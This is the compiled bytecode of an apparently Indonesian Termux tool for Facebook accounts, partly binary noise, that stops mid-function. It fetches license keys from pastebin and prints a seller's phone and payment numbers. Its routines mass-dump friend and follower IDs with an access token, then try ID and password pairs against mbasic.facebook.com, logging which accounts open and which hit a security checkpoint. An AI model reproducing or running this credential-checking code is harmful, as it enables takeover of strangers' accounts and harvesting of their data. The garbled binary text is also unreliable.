a
    r�ba]� �                
   @   s\  e d � zddlT W n6 eyJ Z ze de � e�  W Y dZ[n
dZ[0 0 ze�d�j�� Z	W n� ej
jy�   e�d� e ed � ej��  Y n^ ey� Z zFe ed e d	 e d
 e de  �f e�d� e�  W Y dZ[n
dZ[0 0 e	� Ze	� Ze	� Ze	� ZdZdZdZdZdZdZdZdZdZ dZ!dZ"dZ#dZ$dZ%dZ&dZ'dZ(dZ)dZ*dZ+dZ,d Z-d!Z.d"Z/d#Z0e e& Z1d$Zd%Z2d&Z3d'Zd(Z)d)Z4d&Z5ed e d	 e d* e Z6ed e d+ e d* e Zed e d, e d* e Z7ed e d- e d* e Z8ed e d. e d* e Z9ed e d/ e d* e Z:da;g a<g a=g a>g a?da@daAdaBdZCdaDg ZEg ZFg ZGdaHd0ZId1d2� ZJeKeL�M� �Nd3��ZOePjQZRePjSZTePjUZVeL�M� ZPeKeL�M� �Nd4��ZWeKeL�M� �Nd5��ZXeL�M� �Nd6�ZYz�e�d7�j�� ZZe�d8�j�� Z[eXe[k�re\�  e��  zheZd9v �r>e ed: �f e�d� n@e]�  e ed; e^ eZ � e ed< e* e[ � e ed= � e�  W n* e_e`f�y�   e ed> � e�  Y n0 W n* e_e`f�y�   e ed> � e�  Y n0 d?d@� ZadAdB� ZbdCdD� ZcdEdF� ZddGdH� ZedIdJ� ZfdKdL� ZgdMdN� ZhdOdP� ZidQdR� ZjdSdT� ZkdUdV� ZldWdX� ZmdYdZ� Znd[d\� Zod]d^� Zpd_d`� Zqdadb� Zrdcdd� Zsdedf� Ztdgdh� Zudidj� Zvdkdl� Zwdmdn� Zxdodp� Zydqdr� Zzdsdt� Z{dudv� Z|dwdx� Z}dydz� Z~d{d|� Zd}d~� Z�dd�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�d�e�d�d�d�d��a�d�d�� Z�d�d�� Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�dÄ Z�d�d�dƄZ�d�dȄ Z�d�dʄ Z�d�d̄ Z�d�d΄ Z�d�dЄ Z�d�d҄ Z�d�dԄ Z�d�d�dׄZ�d�Z�d�dڄ Z�d�d܄ Z�d�dބ Z�d�d�� Z�d�d� Z�e�d�k�rXe�ej��d�k�r�ej�d d�k�r�e�d� eb�  e��d�Z�e�D ]vZ�d�e� Z�z"e�e�d���� Z�d�eKe�e��� Z�W n   d�Z�Y n0 e ed� e, e� e+ d� e. d� e+ d� e, e� � �q�e�d�e d� e^ �Z�ze�e�d���� Z�W n0 e��y�   e ed� � e�d� e�  Y n0 e�e�� nTej�d d�k�r�ej�  n<ej�d d�k�r�e}�  e�e7d� � ne ed� � ee7d� � z e�d�� e��  e��  ez�  W n8 e�yV Z ze de � e�  W Y dZ[n
dZ[0 0 dS )�z1[!] Wait a moment... Checking Network and License�    )�*�[!] Error : %sNzBhttps://github.com/TEAM-TERMUX-INDONESIA/DATA-FILE/blob/main/Memek�clear�Your Network Doesn t Exist �[�   •�]� Error : %s�   �https://m.facebook.com�{NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+zIyhaa Jarr (Jarr)z
10-10-2021z
06-09-2021z
31-10-2021z[00mz[40mz[44mz[46mz[42mz[45mz[41mz[47mz[43mz[0;94m�[0;92mz[0;96m�[0;91mz[0;95mz[0;93mz[0;97mz[0;90mz[0;33mz[0;31mz[0;32mz[0;36mz[0;34mz[0;35m�] �!�?�   ••z!!z??�https://mbasic.facebook.comc                 C   s   dt | � d S )Nz[1;�m)�str)Zcol� r   �0/data/data/com.termux/files/home/premium/prem.py�<lambda>T   �    r   z%d-%m-%Yz%Y-%m-%dz%Y%m%dz%H:%M:%Sz!https://pastebin.com/raw/exzCY7sMz!https://pastebin.com/raw/SNHmCTDF)zMR.RISKYZDownnZDownzServer Saat Ini AktifzServer Used : zAdmin Set Date : z0Server Currently Maintenance.. Contact Author !!z#Please Check Your Internet Network c                 C   s   t �| � d S �N)�os�system)�dumr   r   r   �bash{   s    r   c                   C   s
   t �  d S r   )�bannerr   r   r   r   �logo}   s    r    c                 C   s2   | d D ]$}t j�|� t j��  t�d� qd S )N�
g{�G�z�?)�sys�stdout�write�flush�time�sleep)�z�er   r   r   �jalan   s    
r*   c                  C   s^   zt dd��� } W n, ty>   t�d� t�d� t�  Y n0 tj�d�rTt�  nt�  d S )N�.prem�rr   �rm -rf .prem)	�open�read�IOErrorr   r   �romz�path�exists�cekprem��toketr   r   r   �license�   s    

r7   c                  C   s^   zt dd��� } W n, ty>   t�d� t�d� t�  Y n0 tj�d�rTt�  nt�  d S )N�.adminr,   r   �rm -rf .admin)	r.   r/   r0   r   r   �romz1r2   r3   �cekadminr5   r   r   r   �license2�   s    

r<   c               	   C   s|  t �d� t�  t�t� �j�� } z�tt	d t
 �}t|�dk rnt|dv rRt	d nt	d � t�d� t�  q4t�t� �j�� } || v r�t�  |}tdt	 d	 t
 d
 � tdd�}|�|� |��  t�  n(t�  tdt	 d	 t d � t �d� W n~ tjj�y0   t �d� tt	d � t j��  Y nH t�yL   t j��  Y n, ttf�yv   t�d� t j��  Y n0 d S )Nr   zKode Premium : �#   �� � �License Can't Be Empty !!�&Key/License Must Be More Than 35 Words�   r!   �Status Premium : �   ✓r+   �w�Xr-   �Tidak Ada Jaringan !!r
   )r   r   r    �requests�get�Link_Premium�text�strip�input�war�i�lenr*   r&   r'   r1   �kntl�printr.   r$   �close�exitr   �
exceptions�ConnectionErrorr"   �KeyboardInterrupt�KeyErrorr0   ��rr�lZ	kata_premZidqr   r   r   r1   �   s<    





r1   c               	   C   s�  t �d� t�  t�t� �j�� } z�tt	d t
 �}t|�dk rnt|dv rRt	d nt	d � t�d� t�  q4t�t� �j�� } || v r�t�  |}tdt	 d	 t
 d
 � tdd�}|�|� |��  t�  n.t�  tdt	 d	 t d � t �d� t�  W n~ tjj�y6   t �d� tt	d � t j��  Y nH t�yR   t j��  Y n, ttf�y|   t�d� t j��  Y n0 d S )Nr   zKode Administrasi : r=   r>   rA   rB   rC   r!   �Status Administrasi : rE   r8   rF   rG   r9   rH   r
   )r   r   r    rI   rJ   �
Link_AdminrL   rM   rN   rO   rP   rQ   r*   r&   r'   r:   rR   rS   r.   r$   rT   rU   r   rV   rW   r"   rX   rY   r0   rZ   r   r   r   r:   �   s>    







r:   c               �   C   s�  t �d� t�  t�t� �j�� } �z�tdd��	� }t
|�dk rxt|dv rRtd ntd � t�d� t �d	� t�  q4t�t� �j�� } || v �r�td
t d t d � tdd��	� }| �|d �}|d � }|�d�}|d � }dt|� }ttd t t � ttd t | � t�d� t|k�rt �d	� td
t d � tt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� d t� d!t� d"t� d#t� dt� d$t� d%t� dt� d$t� d&t� dt� d$t� d't� dt� d(t� dt� d)t� d!t� d*t� d+t� d,t� d-t� d.t� d/t� d0t� d.t� d1t� d2t� d3t� d4t� d.t� d5t� d+t� d6t� d-t� d.t� d/t� d0t� d.t� d7t� d8t� d3t� d4t� d3t� d9t� d3t� d:t� d.t� d;t� ��� t�  n.td
t d t d< � t �d	� ttd= � W n~ tjj �yP   t �d� ttd> � t j!��  Y nH t"�yl   t j!��  Y n, t#t$f�y�   t�d� t j!��  Y n0 d S )?Nr   r+   r,   r=   r>   rA   rB   rC   r-   r!   rD   rE   �|r
   �<r   �%s�Tanggal Now     : �Tanggal Expired : �      �?�0Sorry Your Key/License Has Expired... Or Expired�(Social Accounts And Whatsapp Numbers :

�	Whatsapp �:� +6283143565470 �(�Mr.Risky�)
�	Telegram �	Facebook � m.facebook.com/llovexnxx �Risky�)

�!Author Uses 4 Payment Methods :

�DANA  � 083143565470
�OVO   �GOPAY �PULSA � 083143565470 �AXIS�Key/License Price :

�--- �Key Premium
�	1 Minggu �=�
 Rp10.000
�	1 Bulan  �
 Rp25.000
�2 Bulan �+� Bot Follow �	 30.000

�
Key Admin
�
 Rp30.000
�3 Bulan �
 Bot Like � Bot Share Posts in Profile �	 Rp40.000rG   z Sorry you are not a premium user�#Sorry Your Network Doesn t Exist !!)%r   r   r    rI   rJ   rK   rL   rM   r.   r/   rQ   r*   rO   r&   r'   rU   rS   rP   �splitr   �I�waktuu�waktu�C�P�K�U�B�M�qr   rV   rW   r"   rX   rY   r0   �r[   r\   �titidZlonjaZpelerZ	tanggalxdZhgfr   r   r   r4   �   sX   









����������������������	�	�	�
�
�
���������������������������������������


r4   c               �   C   s�  t �d� t�  t�t� �j�� } �z�tdd��	� }t
|�dk rxt|dv rRtd ntd � t�d� t �d	� t�  q4t�t� �j�� } || v �r�td
t d t d � tdd��	� }| �|d �}|d � }|�d�}|d � }dt|� }ttd t t � ttd t | � t�d� t|k�rt �d	� td
t d � tt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� d t� d!t� d"t� d#t� dt� d$t� d%t� dt� d$t� d&t� dt� d$t� d't� dt� d(t� dt� d)t� d!t� d*t� d+t� d,t� d-t� d.t� d/t� d0t� d.t� d1t� d2t� d3t� d4t� d.t� d5t� d+t� d6t� d-t� d.t� d/t� d0t� d.t� d7t� d8t� d3t� d4t� d3t� d9t� d3t� d:t� d.t� d;t� ��� t�  n.td
t d t d< � t �d	� ttd= � W n~ tjj �yP   t �d� ttd> � t j!��  Y nH t"�yl   t j!��  Y n, t#t$f�y�   t�d� t j!��  Y n0 d S )?Nr   r8   r,   r=   r>   rA   rB   rC   r9   r!   r]   rE   r_   r
   r`   r   ra   rb   rc   rd   re   rf   rg   rh   ri   rj   rk   rl   rm   rn   ro   rp   rq   rr   rs   rt   ru   rv   rw   rx   ry   rz   r{   r|   r}   r~   r   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   rG   z Sorry You Are Not Administrationr�   )%r   r   r    rI   rJ   r^   rL   rM   r.   r/   rQ   r*   rO   r&   r'   rU   rS   rP   r�   r   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r   rV   rW   r"   rX   rY   r0   r�   r   r   r   r;     sX   









����������������������	�	�	�
�
�
���������������������������������������


r;   c               
   C   s   t j�d�rt�  t� d�} n
t� d�} t j�d�rFt�  t� d�}n
t� d�}t �d� td t	 d t d }td t	 d	 t d }td t
 d
 t d }t�  ttd t	 d �t�d�f ttd |  d | �t�d�f tdt d t d t d t d t d t	 d t d � ttd t d t d t d t d t	 d t d � ttd t d t d t d | � ttd t d t d t d | � ttd t d t d t d | � ttd t d t d t d | � ttd t d  t d t d! | d" � ttd t d# t d t d$ | d � �z<| t� d�fv �rv�z�|t� d�fv �r�ttd% �}|d&v �r�ttd' � t�d(� t�  n�|d)v �r�t�  t�  n�|d*v �r�t�  t�  n�|d+v �rt�  t�  n�|d,v �r2ttd- � t�d(� t�  t�  n||d.v �rJt�  t�  nd|d/v �rbt�  t�  nL|d0v �rzt�  t�  n4|d1v �r�t�  t�  nttd' � t�d(� t�  �n\z�ttd% �}|d&v �r�ttd' � t�d(� t�  n�|d)v �r t�  t�  n�|d*v �rt�  t�  n�|d+v �rFttd- � t�d(� t�  t�  nd|d.v �r^t�  t�  nL|d/v �rvt�  t�  n4|d0v �r�t�  t�  nttd' � t�d(� t�  W n` t�y } zFttd t d2 t d t d3|  �f t�d4� t�  W Y d }~n
d }~0 0 W n` t�yp } zFttd t d2 t d t d3|  �f t�d4� t�  W Y d }~n
d }~0 0 �n"z�|t� d�fv �r"ttd% �}|d&v �r�ttd' � t�d(� t�  nb|d,v �r�ttd- � t�d(� t�  t�  n4|d1v �rt�  t�  nttd' � t�d(� t�  nttd5 � t�  W n` t�y� } zFttd t d2 t d t d3|  �f t�d4� t�  W Y d }~n
d }~0 0 W n` t�y� } zFttd t d2 t d t d3|  �f t�d4� t�  W Y d }~n
d }~0 0 d S )6Nr+   �Yes�Notr8   r   rj   ZPremium�)ZAdminZMaintenancezNama Pembeli/Donasi  : u   –g
ףp=
�?zStatus Premium/Admin : �/皙�����?r!   r   �1r   z Check Option Sensi Akun �2z Change File Separator �3z Checkpoint Detector From File �4z# Dump ID Follow Masal (max-500000) �5z( Check the number of friends and follow �6z% Old or Young Facebook ID Separation �7z Facebook bots r?   �8z- Dump ID From Public And Follow (Dump Brutal)zPilih : r>   zIsi Dengan Benar !!�   �r�   �01�r�   �02�r�   �03�r�   �04z/Sorry, this menu is currently under maintenance�r�   �05�r�   �06�r�   �07)r�   �08r   r	   r
   zBack To Menu) r   r2   r3   r7   rP   r   r<   r   r�   r�   r�   r    rS   rO   r&   r'   �k�prN   �inp�menuvvip�
buatngecekrU   �ganti_pemisah�
Login_userr*   �
checkteman�oldid�menu_bot�dumppro�	Exception�menu)Z	prem_stasZ
admin_stasZqqwZqww�qwqZdmr)   r   r   r   r�   c  s�    




"@<((((,,























4 4 






4 4r�   c               
   C   s@  t td � t�d� ttd t �} | dks6| dkr<t�  d}ttd t �}|dks`|dkrft�  t td t d	 | � z td
d��	� }td
d��	� }W n^ t
y� } zFt td t d t d t d|  �f t�d� t�  W Y d }~n
d }~0 0 t�d|  d | �}t�|j�}z�d�dd�}t|d�}	|d D ]>}
|
d }|
d }t�|d | � |	�|d | d � �q@|	��  dttt�� }t td t ttt�� � t dt � W n   Y n0 ztd||� W nZ t
�y: } z@ttd t d t d t d|  �f t�d� W Y d }~n
d }~0 0 d S )NzPThis menu uses a Facebook token and the risk is that the token is easily damagedrC   zTarget ID : r@   r?   Z
9999999999�Filename Save : zFiles Saved In : �dump/�	login.txtr,   r   r   r   r	   r
   �https://graph.facebook.com/�/friends?access_token=�.lpp�_rF   �data�id�name�<=>r!   ra   � Total Facebook Accounts Public: �


)rS   rO   r&   r'   rN   r�   r�   r�   r.   r/   r�   r�   r�   �logsrI   rJ   �json�loadsrL   �replacer�   �appendr$   rT   r   rQ   �garis�pro1rU   )�idt�limit�filexr6   �tokenr)   r,   r(   �qqq�yssrP   �uid�na�tmenr   r   r   r�   �  sF    
4
r�   c              
   C   s�   z�t | ��� �� }tdd��`}z,|D ]"}|�d�}|�t|d ||� q$W n" ttfyl   t	t
d � Y n0 W d   � n1 s�0    Y  W n" ttfy�   t	t
d � Y n0 d S )N�   �Zmax_workersr�   r   �Done...�File Tidak Tersedia !!)r.   r/   �
splitlines�ThreadPoolExecutorr�   �submit�dump_publicrY   r0   rU   rO   )�fileZlimZsavefile�	list_akun�su�akunr   r   r   r�     s    
4r�   c                 C   sz  z t dd��� }t dd��� }W n^ ty~ } zFttd t d t d t d|  �f t�d� t�  W Y d }~n
d }~0 0 t	�
d|  d	 | �}t�|j�}zld
| �dd�}t |d�}	|d D ]<}
|
d }|
d }t�|d | � |	�|d | d � q�|	��  W n t�y"   Y n0 t	�
d|  d | �}t�|j�}znd
| �dd�}t |d�}|d D ]>}|d }|d }t�|d | � |�|d | d � �qj|��  W n t�y�   Y n0 zPdttt�� }dttt�� }tdttttt|tt|f	 dd� tj��  W nZ t�yt } z@ttd t d t d t d|  �f t�d� W Y d }~n
d }~0 0 d S )Nr�   r,   r   r   r   r	   r
   r�   r�   r�   r@   r�   �a+r�   r�   r�   r�   r!   �%/subscribers?limit=5000&access_token=ra   z<%sTotal ID Collected From %sPublic%s/%sFollow : %s%s%s/%s%s��end)r.   r/   r�   rS   r�   r�   r&   r'   r�   rI   rJ   r�   r�   rL   r�   r�   r�   r$   rT   rY   �lqr   rQ   rO   r�   r�   r�   r�   r"   r#   r%   )r�   ZlimtZnamefiler6   r�   r)   r,   r(   r�   r�   rP   r�   r�   r[   �zz�dump�ii�nmr�   Zepaqr   r   r   r�     sJ    4

04r�   c            
   
   C   s�  t �d�} | D ] }d| }ttd t | � qtdt d t �}zt|d��� }W n. t	y�   ttd � t
�d� t�  Y n0 ttd	 t �}ttd
 t �}ttd t d � tdd�}t|��� �� }z�tdd��v}z0|D ]&}	|	�|�}	|�t|	d |	d |� q�W n4 ttf�yF   ttd � t
�d� t�  Y n0 W d   � n1 �s^0    Y  W n$ ttf�y�   ttd � Y n0 d S )N�Hasil�Hasil/�Available Files !!: r!   �File Name : r,   �File Not Foundr�   zCurrent Separator :zNext Separator : zFiles Saved In: �separator.txtrF   �
   r�   r   r
   zDone !!rC   r�   )r   �listdirrS   �bulatrP   rN   rO   r.   �	readlines�FileNotFoundErrorr&   r'   r�   r�   r�   r/   r�   r�   r�   r�   �saveidrY   r0   r�   rU   )
�dirsr�   �files�	buka_bajuZpmhjZpmhg�ppxr�   r�   r�   r   r   r   r�   E  s8    




0r�   c                 C   s,   t dd�}|�| | | d � |��  d S )Nr�   �ar!   )r.   r$   rT   )r�   �passwordZmhjr  r   r   r   r  b  s    
r  c               
   C   s  t dt d t d t d t d t d � ttd t �} z tdd��� }tdd��� }W n^ t	y� } zFt
td	 t d
 t d t d|  �f t�d� t�  W Y d }~n
d }~0 0 t�d|  d | �}t�|j�}z~d�dd�}t|d�}g }|d D ]>}	|	d }
|	d }|�|
d | � |�|
d | d � �q|��  dtt|�� }W n t�yt   Y n0 z�t�d|  d | �}t�|j�}d�dd�}t|d�}g }|d D ]>}|d }|d }t�|d | � |�|d | d � �q�|��  dttt�� }W n t�y.   d}Y n0 tdd��� }dtt|�� }t
td t | � t
td t | � t
td t tt|�� d � |dk�r�|dk�r�|dk�r�t td � ttd  � t�  t td! t d" t d# � t�d$� t |� d S )%N�

zType r   �mez& if you want to check your own friendszId Target : r�   r,   r   r   r   r	   r
   r�   r�   r�   r@   r�   rF   r�   r�   r�   r�   r!   ra   r�   r�   �0r�   z!Total Facebook Accounts Follow : z,Sorry, No Friends and Follow List Data FoundzPlease Press Enter !!z+Results Check Friends And Follow Saved At :z dump/check_save.txtr�   r�   )!r*   rO   r�   r�   r�   rN   r�   r.   r/   r�   rS   r�   r�   r&   r'   r�   rI   rJ   r�   r�   rL   r�   r�   r$   rT   r   rQ   rY   �izr   r�   r�   �pepekxa)r�   r6   r�   r)   r,   r(   r�   r�   r�   rP   r�   r�   �temnr[   r�   ZqqqqZysssZidxr�   Zuidd�nanZfllowZbakaZbakAr   r   r   r�   f  sj    04

 



r�   c              
   C   s�   z�t | ��� �� }tdd��b}z.|D ]$}|�d�}|�t|d |d � q$W n" ttfyn   t	t
d � Y n0 W d   � n1 s�0    Y  W n" ttfy�   t	t
d � Y n0 d S )Nr�   r�   r�   r   r
   r�   r�   )r.   r/   r�   r�   r�   r�   �	kontolkaurY   r0   rU   rO   )r�   r�   r�   r�   r   r   r   r  �  s    
4r  c              
   C   sr  z t dd��� }t dd��� }W n^ ty~ } zFttd t d t d t d|  �f t�d� t�  W Y d }~n
d }~0 0 z.t	�
d| |f �}t�|j�}|d	 d
 }W n ttfy�   d}Y n0 zxt	�
d|  d | �}t�|j�}	g }
|	d D ]4}|d }|d }|�d�d }|
�|d | � q�dtt|
�� }W n   d}Y n0 td7 az�ttd t ttt�� t d t d t |  t d t t|� t d t | �t�d�f d| |t|�f }t dd��d| � W n� t�y   ttd � t�  Y n` t�yl } zFttd t d t d t d|  �f t�d� t�  W Y d }~n
d }~0 0 d S )Nr�   r,   r   r   r   r	   r
   �9https://graph.facebook.com/%s/subscribers?access_token=%s�summary�total_countr  r�   r�   r�   r�   r�   r@   r   r_   ra   �ID : �
 Follow : �
 Friend : ���Q��?z$IDZ : %s | Friend : %s | Follow : %szdump/check_save.txtr�   �%s
zBack !!)r.   r/   r�   rS   r�   r�   r&   r'   r�   rI   rJ   r�   r�   rL   rY   r0   �rsplitr�   r   rQ   �jqr�   �intr�   r$   rX   rN   r�   r�   rU   )r�   r�   r6   r�   r)   r,   r(   �pengikutr[   r�   r�   r�   r�   r�   r�   �bh�wrtr   r   r   r  �  sH    4
b
4r  c              
   C   s�  z t dd��� }t dd��� }W n^ ty~ } zFttd t d t d t d|  �f t�d� t�  W Y d }~n
d }~0 0 z.t	�
d| |f �}t�|j�}|d	 d
 }W n ttfy�   d}Y n0 z�t	�
d|  d | �}t�|j�}	g }
|	d D ]4}|d }|d }|�d�d }|
�|d | � q�dtt|
�� }td7 aW n   Y n0 z\ttd t ttt�� t d t d t |  t d t t|� t d t | � W n   Y n0 d S )Nr�   r,   r   r   r   r	   r
   r  r  r  r  r�   z'/subscribers?limit=999999&access_token=r�   r�   r�   r@   r   r_   ra   z    [r  r  r  )r.   r/   r�   rS   r�   r�   r&   r'   r�   rI   rJ   r�   r�   rL   rY   r0   r  r�   r   rQ   r  r�   r  r�   )r�   r�   r6   r�   r)   r,   r(   r  r[   r�   r�   r�   r�   r�   r�   r  r   r   r   �cek_epep�  s8    4
\r  c                  C   sz  zt dd��� } W n^ typ } zFttd t d t d t d|  �f t�d� t�  W Y d }~n
d }~0 0 t	�
d�}|D ] }d	| }ttd
 t | � q�tdt d t �}zt |d��� }W n. ty�   ttd � t�d� t�  Y n0 ttd t tt|�� � ttt d � |D �]<}|�dd�}|�d�}z0|d � }	t�d|	 d |  �}
t�|
j�}W n   Y n0 z|d }W n ttf�y�   d}Y n0 ttd t | d | � zt|d |d � W nh t�y* } z2tdt  d t! d � W Y d }~�q(W Y d }~n&d }~0  tj"j#�yF   Y �q(Y n0 ttd t  d t d � �q(tt� d�� d S )Nr�   r,   r   r   r   r	   r
   r�   r�   r�   r!   r�   r�   r�   zTotal Akun : z2==================================================r?   r_   r   r�   �?access_token=�birthdayr@   zSedang Check ID : �   � NOTE : zAccount Already Benned !!z Selesai...)$r.   r/   r�   rS   r�   r�   r&   r'   r�   r   r�   r�   rP   rN   rO   r   r  rU   �ur   rQ   �cr�   r�   rI   rJ   r�   r�   rL   rY   r0   �check_inr   r�   rV   rW   )r6   r)   r  r�   r  r  �memek�kontolr�   r�   �jok�op�ttllr   r   r   r�   �  sR    4





" r�   c           (      C   s>  d}d}d}d}d}d}d}	d}
d	}d
}d}d}d}d}d}t �ddg�}t�� }|j�ddd|d|dddddd|d ddd�� i }t|j|d d|id�jd�}|�	d d!d"i�}g d#�}|�
d$�D ]0}|�d%�|v r�|�|�d%�|�d&�i� q�q�q�|�| |d'�� t|j||�d(� |d)d*�jd�}d+|jv �rd,�d-d.� |j�� �� D ��}t|jd/d0|id1�jd�}d2d.� |�
d3d4d5i�D �d6d � }ttd7 t d8 t d9 t d:ttt|��f  � d;}|D ]>}|d<7 }td=t|� d> |d; d;  d? |d; d<  � �q̐n*d@|jv �r�|�	d �}|�	d$d%dAi�d& }|�	d$d%dBi�d& } |�	d$d%dCi�d& }!||| | dDdE|!dF�}"t|j||d(  |"dG�jd�}#dHd.� |#�
dI�D �}$ttd7 t d8 t d9 t dJ t tt|$�� � tt|$��D ]&}%tdKt|%d< � dL |$|%  � �q�t|$�d;k�rttdMt d7 t d8 t d9 t dN t � tdOdP�}&|&�| dQ | dM � |&��  nDt|$�dRk�r�tdMt d7 t d8 t d9 t dS t � ntd>� n�dTt|�v �r|�	dUdVdTi��	dU�j}'ttd7 t d8 t d9 t dW|'tf  � n,ttd7 t d8 t d9 t dX t dM � d S )YNr   z�Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.701 Mobile Safari/534.8+z�Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586z�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 OPR/63.3.3216.58675z�Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977z�Mozilla / 5.0 (Linux; Android 5.0; SM-G900P Build / LRX21T; wv) AppleWebKit / 537.36 (KHTML, like Gecko) Version / 4.0 Chrome / 43.0.2357.121 Mobile Safari / 537.36 [ FB _ IAB / FB4A; FBAV / 35.0.0.48.273 ;]z�Mozilla / 5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build / 5887208) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 93.0.4577.62 Mobile Safari / 537.36 [FBAN / EMA; FBLC / ID; FBAV / 239.0.0.10.109 ;]z�Mozilla / 5.0 (Windows NT 10.0; WOW64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 93.0.4577.63 Safari / 537.36 [FBAN / EMA; FBLC / id _ ID; FBAV / 239.0.0.10.109 ;]z�Mozilla / 5.0 (Linux; Android 5.1.1; A37f) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 89.0.4389.105 Mobile Safari / 537.36 [FBAN / EMA; FBLC / ID; FBAV / 239.0.0.10.109 ;]z�Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]��Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 625) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537z�Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/2.0; Touch; rv: 10.0; IEMobile/11.0; NOKIA; Lumia 635) AppleWebKit/537 KHTML, like Gecko) Mobile Safari/537r   �mbasic.facebook.com�	max-age=0r�   �!application/x-www-form-urlencoded�|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�navigate�?1�document�/login/?next&ref=dbl&fl&refid=8�gzip, deflate�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7��Host�cache-control�upgrade-insecure-requests�origin�content-type�
user-agent�acceptzx-requested-withzsec-fetch-sitezsec-fetch-modezsec-fetch-userzsec-fetch-dest�referer�accept-encoding�accept-languager?  ��headers�html.parser�form�method�post�Zlsd�jazoestZm_tsZliZ
try_numberZunrecognized_triesZloginZbi_xrwhrN   r�   �value��email�pass�actionT�r�   Zallow_redirects�c_user�;c                 S   s   g | ]\}}d ||f �qS �z%s=%sr   ��.0�keyrL  r   r   r   �
<listcomp>7  r   zcheck_opq.<locals>.<listcomp>�/https://free.facebook.com/settings/apps/tabbed/�cookie��cookiesc                 S   s   g | ]}t �d t|���qS �zG\<span.*?href=".*?">(.*?)<\/a><\/span>.*?\<div class=".*?">(.*?)<\/div>)�re�findallr   �rV  �tdr   r   r   rX  9  r   ra  �aria-hidden�falser�   r   �++r   z Successful/OK To Login : %s%sr   r
   �  r@   �, �
checkpoint�fb_dtsgrK  �nhr?   �	Lanjutkan�rh  rh  rK  rK  Zcheckpoint_datazsubmit[Continue]ri  �r�   c                 S   s   g | ]
}|j �qS r   �rL   �rV  Zyyr   r   r   rX  F  r   �optionz& Total Available Checkpoint Options:  z[[1;33mz	[1;37m] r!   z" One Tap Yes / SuccessFul To LoginzHasil/Tap_Yes.txtr�   z | r�   zCheckPoint! Try Again Later  �login_error�divr�   z %s%sz, Login Failed! User Id/Password Is Incorrect)�random�choicerI   �SessionrE  �update�parserrJ   rL   �find�find_allrI  r\  �join�get_dict�itemsrS   r�   r�   r�   r   rQ   r�   �ranger.   r$   rT   r�   )(�user�paswr+  �mbZua15Zua14Zua13Zua1Zua10Zua11Zua9Zua8Zua7Zua5Zua12Zua4Zua3Zua2�ua�sesr�   �ged�fm�listrP   �run�kuki�xe�numr�   rG  �dtsg�jzstri  �dataD�xnxx�ngew�optr  �ohr   r   r   �	check_opq  sx    0""48
4$,

.
.r�  c                 C   s`  t �ddg�}t�� }|j�dddtd|ddd	d
ddtd ddd�� i }t|jtd d|id�j	d�}|�
dddi�}g d�}|�d�D ]0}|�d�|v r�|�|�d�|�d�i� q�q�q�|�| |d�� z&t|jt|�d� |dd�j	d�}	W n$ tjj�y   ttd � Y n0 d |jv �r8ttt d! � �n$d"|jv �r|	�
d�}
|
�
ddd#i�d }|
�
ddd$i�d }|
�
ddd%i�d }||||d&d'|d(�}t|jt|
d  |d)�j	d�}d*d+� |�d,�D �}tt|��D ]$}td-t|d. �d/ ||  � �q�nXd0t|	�v �rD|	�
d1d2d0i��
d1�j	}td-t d3 t | � ntd-t d3 t d4 � d S )5Nr   r,  r-  r.  r�   r/  r0  r1  r2  r3  r4  r5  r6  r7  r8  r9  r?  rD  rF  rG  rH  rI  rJ  rN   r�   rL  rM  rP  TrQ  zExcess ProblemrR  z!This Account Doesn't Check Pointsrg  rh  rK  ri  r?   rj  rk  rl  c                 S   s   g | ]
}|j �qS r   rm  rn  r   r   r   rX  �  r   z dekura_chann.<locals>.<listcomp>ro  r"  r
